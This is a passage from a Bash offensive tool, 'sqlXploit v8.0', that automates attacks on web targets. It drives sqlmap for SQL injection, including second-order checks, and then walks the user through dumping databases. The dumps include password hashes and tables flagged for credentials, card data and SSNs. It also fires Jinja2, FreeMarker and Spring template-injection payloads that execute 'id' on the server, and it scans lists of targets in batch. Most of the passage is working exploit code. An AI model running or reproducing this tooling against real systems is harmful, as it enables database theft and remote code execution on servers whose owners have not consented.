        echo "$file_body" | grep -q "ref:" && [[ "$path" == *".git"* ]] && \
          vuln "  ↳ GIT REPO exposed!"
        ((FOUND++)) || true
      fi
    done

    unset batch_files
    i=$(( i + batch ))
  done

  # ── API key leak in page body ──
  local page; page=$(do_curl "$url" | head -c 8000)
  echo "$page" | grep -qiE 'api[_-]?key\s*[=:]\s*["\x27]?\w{20,}|access[_-]?token|secret[_-]?key' && \
    warn "Possible API key / secret in page body" && \
    echo "[API_KEY_HINT] ${url}" >> "$HITS_FILE"

  ok "Info scan done — ${FOUND} sensitive file(s) found"
}

# ═══════════════════════════════════════════════════════════════
#  SECOND ORDER SQLi — only in DEEP mode
# ═══════════════════════════════════════════════════════════════
test_second_order_sqli() {
  local url="$1"
  $DO_SECOND_ORDER || return

  step "Second-order SQLi check..."
  local base_host; base_host=$(echo "$url" | grep -oP 'https?://[^/]+')
  local retrieval_eps=( "/profile" "/account" "/user" "/dashboard" "/me" "/settings" )
  for ep in "${retrieval_eps[@]}"; do
    local sc; sc=$(http_code "${base_host}${ep}")
    [[ "$sc" =~ ^(200|302)$ ]] || continue
    intel "Valid endpoint: ${base_host}${ep}"
    local sqm_out
    sqm_out=$(timeout 120 sqlmap -u "$url" \
      "--second-url=${base_host}${ep}" \
      --technique=BEUST --level=2 --risk=1 \
      --batch --random-agent --disable-coloring \
      "--output-dir=${DUMP_DIR}" 2>&1 | sanitize_output) || true
    echo "$sqm_out" | tee -a "$LOG_FILE"
    echo "$sqm_out" | grep -qiE "parameter.*is vulnerable|is injectable" && \
      hit "SECOND ORDER SQLi found!" && \
      echo "[SECOND_ORDER_SQLI] ${url} → ${base_host}${ep}" >> "$HITS_FILE"
  done
}

# ═══════════════════════════════════════════════════════════════
#  INTERACTIVE GUIDED DUMP (unchanged from v7.1)
# ═══════════════════════════════════════════════════════════════
interactive_dump() {
  local url_arg="$1" label="$2"
  sep; hit "INJECTION CONFIRMED — ${label}"; sep
  local ts=$(( BASELINE_TIME / 1000 + TIME_SEC ))
  (( ts < TIME_SEC )) && ts=$TIME_SEC; (( ts > 20 )) && ts=20
  local base_arr=(); build_sqlmap_cmd base_arr "$url_arg" "BEUST" 1 1 "$ts"

  # Step 1: auto get DB info
  sep; step "[AUTO] Fetching current DB, user, DBA status..."
  local info_out
  info_out=$( "${base_arr[@]}" --current-db --current-user --is-dba 2>&1 | sanitize_output ) || true
  echo "$info_out" | tee -a "$LOG_FILE"
  local cur_db cur_user is_dba
  cur_db=$(echo   "$info_out" | grep -oP "(?i)current database:\s*'?\K[^'\s]+"  | head -1 || echo "")
  cur_user=$(echo "$info_out" | grep -oP "(?i)current user:\s*'?\K[^'\s]+"      | head -1 || echo "")
  is_dba=$(echo   "$info_out" | grep -oiP "(?i)is-dba.*\K(True|False)"          | head -1 || echo "unknown")
  log "  ${G}DB:${NC} ${cur_db:-?}  ${G}User:${NC} ${cur_user:-?}  ${G}DBA:${NC} ${is_dba}"
  echo "[INFO] DB=${cur_db} User=${cur_user} DBA=${is_dba}" >> "$HITS_FILE"

  if echo "$is_dba" | grep -qi "true"; then
    hit "DBA CONFIRMED!"
    iask_yn "  Dump all users + password hashes?" && {
      local pw_out
      pw_out=$( "${base_arr[@]}" --users --passwords 2>&1 | sanitize_output ) || true
      echo "$pw_out" | tee -a "$LOG_FILE"
      echo "$pw_out" > "${DUMP_DIR}/users_and_hashes.txt"
      echo "[DUMPED] users_and_hashes" >> "$HITS_FILE"
    }
  fi

  # Step 2: list databases
  sep
  iask_yn "List all databases?" "y" || {
    [[ -n "$cur_db" ]] && _dump_db "$url_arg" "$label" "$cur_db" "${base_arr[@]}" || err "No DB."
    return
  }

  step "Enumerating databases..."
  local dbs_out; dbs_out=$( "${base_arr[@]}" --dbs 2>&1 | sanitize_output ) || true
  echo "$dbs_out" | tee -a "$LOG_FILE"

  local db_list=()
  while IFS= read -r line; do
    local dn=""
    echo "$line" | grep -qP '^\[\*\]\s+\S+' && dn=$(echo "$line" | grep -oP '(?<=\[\*\]\s)\S+')
    [[ -z "$dn" ]] && echo "$line" | grep -qP '^\s+\[\d+\]' && dn=$(echo "$line" | grep -oP '(?<=\]\s)\S+' | head -1)
    [[ -n "$dn" ]] && db_list+=("$dn")
  done <<< "$dbs_out"
  (( ${#db_list[@]} == 0 )) && [[ -n "$cur_db" ]] && db_list+=("$cur_db")
  (( ${#db_list[@]} == 0 )) && { err "No DBs found."; return; }

  local skip_p="^(information_schema|performance_schema|mysql|sys|pg_catalog|template0|template1)$"
  local user_dbs=()
  for db in "${db_list[@]}"; do
    echo "$db" | grep -qiE "$skip_p" || user_dbs+=("$db")
  done
  log "  ${C}User DBs:${NC} ${user_dbs[*]:-none}"

  local chosen=()
  if (( ${#user_dbs[@]} == 1 )); then
    chosen=( "${user_dbs[0]}" )
  elif (( ${#user_dbs[@]} > 1 )); then
    log "  ${G}0${NC}) ALL"; local idx=1
    for db in "${user_dbs[@]}"; do log "  ${G}${idx}${NC}) ${db}"; ((idx++)) || true; done
    local ch; ch=$(iask "  Choice [0=all]: " "0")
    if [[ "$ch" == "0" ]]; then
      chosen=( "${user_dbs[@]}" )
    else
      IFS=',' read -ra ns <<< "$ch"
      for n in "${ns[@]}"; do
        n=$(echo "$n" | tr -d ' ')
        (( n >= 1 && n <= ${#user_dbs[@]} )) && chosen+=( "${user_dbs[$((n-1))]}" )
      done
      (( ${#chosen[@]} == 0 )) && chosen=( "${user_dbs[@]}" )
    fi
  fi

  for db in "${chosen[@]}"; do
    _dump_db "$url_arg" "$label" "$db" "${base_arr[@]}"
  done
  sep; ok "Dump complete → ${DUMP_DIR}/"
}

_dump_db() {
  local url_arg="$1" label="$2" db="$3"; shift 3
  local base_arr=( "$@" )
  sep; log "${C}${BOLD}  DB: ${db}${NC}"
  iask_yn "  List tables in '${db}'?" "y" || { info "Skipping ${db}"; return; }

  step "Tables in ${db}..."
  local tout; tout=$( "${base_arr[@]}" -D "$db" --tables 2>&1 | sanitize_output ) || true
  echo "$tout" | tee -a "$LOG_FILE"

  local tlist=()
  while IFS= read -r line; do
    echo "$line" | grep -qP '^\|\s+\S+\s+\|' && \
      tlist+=( "$(echo "$line" | grep -oP '(?<=\|\s)\S+(?=\s+\|)' | head -1)" )
  done <<< "$tout"
  (( ${#tlist[@]} == 0 )) && { warn "No tables in ${db}"; return; }

  local idx=1
  for tb in "${tlist[@]}"; do
    local f=""
    echo "$tb" | grep -qiE "user|admin|pass|cred|customer|email|token|secret|auth|payment|card|order" \
      && f=" ${R}★${NC}"
    log "  ${G}${idx}${NC}) ${tb}${f}"
    ((idx++)) || true
  done

  iask_yn "  Dump tables from '${db}'?" "y" || { info "Skipping"; return; }
  log "  ${G}0${NC}) ALL  or numbers/names comma-separated"
  local ch; ch=$(iask "  Choice: " "0")

  local chosen=()
  if [[ "$ch" == "0" ]]; then
    chosen=( "${tlist[@]}" )
  elif echo "$ch" | grep -qP '^\d+(,\d+)*$'; then
    IFS=',' read -ra ns <<< "$ch"
    for n in "${ns[@]}"; do
      n=$(echo "$n" | tr -d ' ')
      (( n >= 1 && n <= ${#tlist[@]} )) && chosen+=( "${tlist[$((n-1))]}" )
    done
  else
    IFS=',' read -ra nms <<< "$ch"
    for nm in "${nms[@]}"; do nm=$(echo "$nm" | tr -d ' '); [[ -n "$nm" ]] && chosen+=("$nm"); done
  fi
  (( ${#chosen[@]} == 0 )) && chosen=( "${tlist[@]}" )

  for tb in "${chosen[@]}"; do
    [[ -z "$tb" ]] && continue
    _dump_table "$url_arg" "$label" "$db" "$tb" "${base_arr[@]}"
  done
}

_dump_table() {
  local url_arg="$1" label="$2" db="$3" tb="$4"; shift 4
  local base_arr=( "$@" )
  sep; log "${C}${BOLD}  TABLE: ${db}.${tb}${NC}"

  # Get columns
  step "Columns in ${db}.${tb}..."
  local cout; cout=$( "${base_arr[@]}" -D "$db" -T "$tb" --columns 2>&1 | sanitize_output ) || true
  echo "$cout" | tee -a "$LOG_FILE"

  local col_names=()
  while IFS= read -r line; do
    echo "$line" | grep -qP '^\|\s+\w+\s+\|' || continue
    local cn; cn=$(echo "$line" | awk -F'|' '{gsub(/[[:space:]]/,"",$2); print $2}')
    [[ -n "$cn" && "$cn" != "Column" && "$cn" != "-" ]] && col_names+=("$cn")
  done <<< "$cout"

  if (( ${#col_names[@]} > 0 )); then
    local ci=1
    for cn in "${col_names[@]}"; do
      local cf=""
      echo "$cn" | grep -qiE "pass|secret|token|key|hash|credit|card|cvv|ssn|salary|balance" && cf=" ${R}★${NC}"
      log "  ${G}${ci}${NC}) ${cn}${cf}"
      ((ci++)) || true
    done
  fi

  # Choose columns
  local col_flag=""
  if (( ${#col_names[@]} > 0 )) && iask_yn "  Specific columns only?"; then
    local cc; cc=$(iask "  Col numbers/names: " "")
    if [[ -n "$cc" ]]; then
      local chosen_c=()
      if echo "$cc" | grep -qP '^\d+(,\d+)*$'; then
        IFS=',' read -ra ns <<< "$cc"
        for n in "${ns[@]}"; do
          n=$(echo "$n" | tr -d ' ')
          (( n >= 1 && n <= ${#col_names[@]} )) && chosen_c+=( "${col_names[$((n-1))]}" )
        done
      else
        IFS=',' read -ra nms <<< "$cc"; for nm in "${nms[@]}"; do nm=$(echo "$nm" | tr -d ' '); [[ -n "$nm" ]] && chosen_c+=("$nm"); done
      fi
      (( ${#chosen_c[@]} > 0 )) && col_flag="-C $(IFS=','; echo "${chosen_c[*]}")"
    fi
  fi

  # Row limit
  local start_flag="" stop_flag=""
  local cnt_out cnt_val
  cnt_out=$( "${base_arr[@]}" -D "$db" -T "$tb" --count 2>&1 | sanitize_output ) || true
  cnt_val=$(echo "$cnt_out" | grep -oP '\|\s*\K\d+(?=\s*\|)' | grep -v '^0$' | head -1 || echo "?")
  log "  ${Y}Row count: ${cnt_val}${NC}"

  if [[ "$cnt_val" =~ ^[0-9]+$ ]] && (( cnt_val > 500 )); then
    warn "  Large table: ${cnt_val} rows"
    log "  ${G}1${NC}) First 500  ${G}2${NC}) First 1000  ${G}3${NC}) Custom  ${G}4${NC}) ALL"
    local lc; lc=$(iask "  Limit [1]: " "1")
    case "$lc" in
      1) start_flag="--start=0"; stop_flag="--stop=500" ;;
      2) start_flag="--start=0"; stop_flag="--stop=1000" ;;
      3) local rs re; rs=$(iask "  Start: " "0"); re=$(iask "  Stop: " "100")
         start_flag="--start=${rs}"; stop_flag="--stop=${re}" ;;
    esac
  fi

  iask_yn "  Dump ${db}.${tb}?" "y" || { info "Skipping"; return; }

  local dcmd=( "${base_arr[@]}" -D "$db" -T "$tb" --dump )
  [[ -n "$col_flag"   ]] && dcmd+=( $col_flag )
  [[ -n "$start_flag" ]] && dcmd+=( "$start_flag" )
  [[ -n "$stop_flag"  ]] && dcmd+=( "$stop_flag" )

  step "Dumping ${db}.${tb}..."
  local dout; dout=$( "${dcmd[@]}" 2>&1 | sanitize_output ) || true
  echo "$dout" | tee -a "$LOG_FILE"

  local sf; sf=$(echo "${tb}" | tr '/' '_')
  echo "$dout" > "${DUMP_DIR}/${db}_${sf}.txt"
  ok "Saved → ${DUMP_DIR}/${db}_${sf}.txt"
  echo "[DUMPED] ${label} → ${db}.${tb}" >> "$HITS_FILE"

  iask_yn "  Export as CSV?" && {
    local cdout; cdout=$( "${dcmd[@]}" --dump-format=CSV 2>&1 | sanitize_output ) || true
    echo "$cdout" > "${DUMP_DIR}/${db}_${sf}.csv"
    ok "CSV → ${DUMP_DIR}/${db}_${sf}.csv"
  }
  sleep "${CURRENT_DELAY:-0}"
}

# ═══════════════════════════════════════════════════════════════
#  SSTI — from v7.1 (fixed quoting)
# ═══════════════════════════════════════════════════════════════
test_ssti_fast() {
  local url="$1"
  $SCAN_SSTI || return
  # SSTI is handled inline in _run_nonsqli_parallel for speed
  # This function adds the RCE escalation if SSTI was already found
  grep -q "\[SSTI\].*${url}" "$HITS_FILE" 2>/dev/null || return
  local param; param=$(grep "\[SSTI\].*${url}" "$HITS_FILE" | grep -oP 'param=\K\w+' | head -1)
  [[ -z "$param" ]] && return
  step "SSTI RCE escalation on param: ${param}"
  local rce_jinja2_os=$'{% import \'os\' as os %}{{ os.popen(\'id\').read() }}'
  local rce_freemarker=$'<#assign ex = \'freemarker.template.utility.Execute\'?new()>${ex(\'id\')}'
  local rce_spring='${T(java.lang.Runtime).getRuntime().exec("id")}'
  for rce in "$rce_jinja2_os" "$rce_freemarker" "$rce_spring"; do
    local enc; enc=$(python3 -c "import sys,urllib.parse; print(urllib.parse.quote(sys.argv[1]))" "$rce" 2>/dev/null || echo "$rce")
    local body; body=$(do_curl "$(echo "$url" | sed "s|\(${param}=\)[^&]*|\1${enc}|")")
    echo "$body" | grep -qiE "uid=[0-9]+|root:[x*]:0|/bin/bash" && \
      vuln "SSTI RCE CONFIRMED!" && \
      echo "[SSTI_RCE] ${url} param=${param}" >> "$HITS_FILE" && \
      echo "$body" | head -50 > "${VULN_DIR}/ssti_rce_${param}.txt" && return
    sleep 0.2
  done
}

# ═══════════════════════════════════════════════════════════════
#  ⑫ MAIN PROCESS_TARGET — smart orchestrator with timing
# ═══════════════════════════════════════════════════════════════
process_target() {
  local url_arg="$1" label="$2" probe_url="$3"

  # Reset state
  BLOCK_COUNT=0; CURRENT_DELAY=0; CURRENT_THREADS=$SQLMAP_THREADS
  TAMPER_INDEX=0; CURRENT_TAMPER=""; WAF_NAME=""; DBMS_HINT=""
  IS_UNSTABLE=false; COLUMN_COUNT=0; DETECTED_TECHNIQUE=""
  INJECTABLE_PARAM=""; SQLI_FOUND=false; OOB_FIRED_LABELS=()

  sep
  log "${G}${BOLD}TARGET: ${label}${NC}"
  log "${DIM}  Mode: ${MODE_NAME} | Started: $(date '+%H:%M:%S')${NC}"
  sep

  local T0=$(date +%s)

  # ── A: Baseline + Fingerprint (fast, parallel) ──
  capture_baseline   "$probe_url"
  fingerprint_target "$probe_url"

  # ── B: Setup shared OOB (one URL for all modules) ──
  setup_shared_oob

  # ── C: SQLi scan (adaptive, pre-scanned technique) ──
  sep; info "${BOLD}▶ SQLi SCAN [${MODE_NAME}]${NC}"
  adaptive_scan "$url_arg" "$probe_url" "$label"
  timer "SQLi scan: $(( $(date +%s) - T0 ))s elapsed"

  # ── D: OOB SQLi payloads (fire and forget, no poll yet) ──
  if $DO_OOB; then
    sep; info "${BOLD}▶ OOB SQLi (async)${NC}"
    test_oob_sqli "$probe_url"
  fi

  # ── E: Second-order (DEEP only) ──
  $DO_SECOND_ORDER && test_second_order_sqli "$probe_url"

  # ── F: Non-SQLi — ALL modules in one parallel pass ──
  local any_nonsqli
  any_nonsqli=$( $SCAN_SSRF || $SCAN_SSTI || $SCAN_XSS || $SCAN_LFI || \
                 $SCAN_CMDI || $SCAN_XXE  || $SCAN_REDIR || $SCAN_INFO; echo $? )
  if [[ "$any_nonsqli" == "0" ]] || $SCAN_SSRF || $SCAN_SSTI || $SCAN_XSS || \
     $SCAN_LFI || $SCAN_CMDI || $SCAN_XXE || $SCAN_REDIR || $SCAN_INFO; then

    sep; info "${BOLD}▶ Non-SQLi Scan (parallel engine)${NC}"
    local T_NS=$(date +%s)

    # The main parallel probe (SSTI, XSS, LFI, CMDi, redirect all at once)
    timeout "$NONSQLI_TIMEOUT" bash -c "$(declare -f _run_nonsqli_parallel do_curl get_url_params pcurl_start pcurl_wait pcurl_waitall step spd info intel warn ok vuln iask iask_yn sep); \
      SCAN_SSRF=${SCAN_SSRF}; SCAN_SSTI=${SCAN_SSTI}; SCAN_XSS=${SCAN_XSS}; \
      SCAN_LFI=${SCAN_LFI}; SCAN_CMDI=${SCAN_CMDI}; SCAN_REDIR=${SCAN_REDIR}; \
      BASELINE_TIME=${BASELINE_TIME}; SHARED_OOB_URL='${SHARED_OOB_URL}'; \
      VULN_DIR='${VULN_DIR}'; HITS_FILE='${HITS_FILE}'; LOG_FILE='${LOG_FILE}'; \
      CK_VAL='${CK_VAL}'; \
      _run_nonsqli_parallel '${probe_url}'" 2>/dev/null || \
    _run_nonsqli_parallel "$probe_url"

    # Dedicated SSRF (SSRF-prone param names, cloud metadata)
    test_ssrf_fast     "$probe_url"
    # XXE (only if target accepts XML)
    test_xxe_fast      "$probe_url"
    # Info disclosure (parallel 38 paths)
    test_info_disclosure_fast "$probe_url"
    # SSTI RCE escalation (if SSTI was found)
    test_ssti_fast     "$probe_url"

    timer "Non-SQLi scan: $(( $(date +%s) - T_NS ))s"
  fi

  # ── G: Single shared OOB poll (all modules already fired) ──
  poll_shared_oob

  # ── H: Interactive dump if SQLi found ──
  $SQLI_FOUND && interactive_dump "$url_arg" "$label"

  local elapsed=$(( $(date +%s) - T0 ))
  sep
  ok "Target done in ${elapsed}s ($(( elapsed / 60 ))m $(( elapsed % 60 ))s)"
  sep

  sleep "${CURRENT_DELAY:-0}"
}

# ═══════════════════════════════════════════════════════════════
#  DISPATCH
# ═══════════════════════════════════════════════════════════════
sep
log "\n${G}${BOLD}⚡ sqlXploit v8.0 — ${MODE_NAME} Mode${NC}"
log "   Output: ${Y}${LOG_DIR}/${NC}\n"; sep

if [[ -n "$burp_file" ]]; then
  probe_url=$(grep -m1 -oP 'https?://[^ \r\n]+' "$burp_file" 2>/dev/null || echo "")
  [[ -z "$probe_url" ]] && { err "Cannot extract URL from Burp file."; exit 1; }
  process_target "-r ${burp_file}" "BurpFile:${burp_file}" "$probe_url"
elif [[ -n "$targets_file" ]]; then
  total=$(wc -l < "$targets_file"); cur=0
  while IFS= read -r target; do
    [[ -z "$target" ]] && continue; ((cur++)) || true
    sep; info "[${cur}/${total}] ${target}"
    process_target "$target" "$target" "$target"
  done < "$targets_file"
else
  process_target "$input_url" "$input_url" "$input_url"
fi

# ═══════════════════════════════════════════════════════════════
#  FINAL REPORT
# ═══════════════════════════════════════════════════════════════
banner; sep
log "${G}${BOLD}  SCAN COMPLETE${NC}"; sep

total_sqli=$(grep -cE "DUMPED|SECOND_ORDER"      "$HITS_FILE" 2>/dev/null || echo 0)
total_oob=$(grep -c  "OOB"                        "$HITS_FILE" 2>/dev/null || echo 0)
total_vuln=$(grep -cE "SSRF|SSTI|CMDI|XXE|LFI|XSS|REDIRECT|INFO|CORS" "$HITS_FILE" 2>/dev/null || echo 0)
total_hits=$(( total_sqli + total_oob + total_vuln ))
total_blks=$(wc -l < "$BLOCK_LOG" 2>/dev/null || echo 0)
total_time=$(( $(date +%s) - SCAN_START ))

log "  ${C}Mode          :${NC} ${MODE_NAME}"
log "  ${C}Total time    :${NC} ${total_time}s ($(( total_time / 60 ))m $(( total_time % 60 ))s)"
log "  ${C}Output        :${NC} ${LOG_DIR}/"
log "  ${Y}Blocks        :${NC} ${total_blks}"
log "  ${R}SQLi findings :${NC} ${total_sqli}"
log "  ${R}OOB findings  :${NC} ${total_oob}"
log "  ${R}Other vulns   :${NC} ${total_vuln}"
log "  ${R}TOTAL         :${NC} ${total_hits}"
sep

if (( total_hits > 0 )); then
  log "${R}${BOLD}  ⚠  ${total_hits} finding(s)!${NC}"
  grep -E "DUMPED|OOB|SSRF|SSTI|CMDI|XXE|LFI|XSS|REDIRECT|BLIND|CORS|SECOND_ORDER" \
    "$HITS_FILE" 2>/dev/null | while IFS= read -r l; do log "  ${R}→${NC} ${l}"; done
else
  log "${G}  ✓  No vulnerabilities confirmed${NC}"
fi
sep

echo -e "\n${C}${BOLD}Speed Architecture (v8.0 vs v7.1):${NC}"
printf "  %-30s %s\n" "Baseline requests:"   "5 → 2  (-60%%)"
printf "  %-30s %s\n" "Pre-scan:"            "None → 6 parallel requests, narrows technique before sqlmap"
printf "  %-30s %s\n" "SQLi phases:"         "4 sequential → 2 targeted  (-50%%)"
printf "  %-30s %s\n" "sqlmap --smart:"      "Skips unlikely params automatically"
printf "  %-30s %s\n" "Non-SQLi probes:"     "Sequential sleep loops → full parallel batch"
printf "  %-30s %s\n" "OOB polling:"         "Per-module waits → single end-of-scan poll"
printf "  %-30s %s\n" "Info disc (38 paths):" "Sequential → 10 at a time parallel"
printf "  %-30s %s\n" "Scan modes:"          "Quick(5-15m) / Smart(20-35m) / Deep(60-90m)"
sep
